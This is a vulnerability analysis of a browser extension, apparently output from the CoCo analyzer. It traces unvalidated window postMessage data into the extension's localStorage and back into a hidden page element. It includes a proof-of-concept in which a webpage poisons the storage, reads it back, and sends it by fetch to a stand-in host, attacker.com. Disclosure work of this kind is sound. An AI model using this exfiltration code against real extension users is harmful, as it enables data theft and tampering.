# CoCo Analysis: ncopbeadajoekpedjllcakdmbmgnfgph

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → bg_localStorage_setItem_value_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ncopbeadajoekpedjllcakdmbmgnfgph/opgen_generated_files/cs_0.js
Line 552    window.addEventListener("message", function(event) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ncopbeadajoekpedjllcakdmbmgnfgph/opgen_generated_files/cs_0.js
Line 553        if(event.data.action == "store"){

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ncopbeadajoekpedjllcakdmbmgnfgph/opgen_generated_files/cs_0.js
Line 554            port.postMessage({"action" : "save", "storageObject" : event.data.data});

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ncopbeadajoekpedjllcakdmbmgnfgph/opgen_generated_files/bg.js
Line 979                localStorage.setItem("BBLogStorage", JSON.stringify(msg.storageObject));
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 552)
window.addEventListener("message", function(event) {
    if(event.data.action == "store"){
        port.postMessage({"action" : "save", "storageObject" : event.data.data}); // ← attacker-controlled
    }
}, false);

// Background script - Message handler (bg.js line 972)
extensionApi.onConnect.addListener(function(port) {
    if(port.name == "storage"){
        port.onMessage.addListener(function(msg) {
            if(msg.action == "get"){
                var storageObject = localStorage.getItem("BBLogStorage");
                storageObject = (typeof storageObject == "undefined" || storageObject == null || storageObject == "undefined") ? {} : JSON.parse(storageObject);
                port.postMessage({"BBLogStorage" : storageObject, "action" : "get"}); // ← sends back to content script
            }
            if(msg.action == "save"){
                localStorage.setItem("BBLogStorage", JSON.stringify(msg.storageObject)); // ← storage sink
            }
        });
    }
});

// Content script - Storage retrieval and DOM injection (cs_0.js lines 544-548, 518-523)
var port = extensionApi.connect({name: "storage"});
port.postMessage({"action" : "get"});
port.onMessage.addListener(function(msg) {
    if (msg.action == "get"){
        inject(window.document, version, extensionApi.getURL("shared"), msg.BBLogStorage); // ← passes storage to inject
    }
});

function inject(document, version, folder, storage){
    // ...
    var str = JSON.stringify(storage); // ← attacker-controlled data
    el = document.createElement('div');
    el.setAttribute('id', 'bblog-storage-init');
    el.setAttribute("style", "display:none");
    el.textContent = str; // ← injected into DOM
    document.body.appendChild(el); // ← attacker can read this from webpage
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// Step 1: Attacker webpage poisons storage
window.postMessage({
    action: "store",
    data: {"malicious": "payload", "secret": "attacker-data"}
}, "*");

// Step 2: Attacker retrieves poisoned data from DOM
setTimeout(() => {
    const storedData = document.getElementById('bblog-storage-init').textContent;
    console.log("Exfiltrated storage:", storedData);
    // Send to attacker server
    fetch("https://attacker.com/exfil", {
        method: "POST",
        body: storedData
    });
}, 1000);
```

**Impact:** Complete storage exploitation chain - attacker can both poison localStorage via window.postMessage and retrieve the poisoned data through DOM injection (div#bblog-storage-init), enabling data exfiltration and manipulation of extension state.
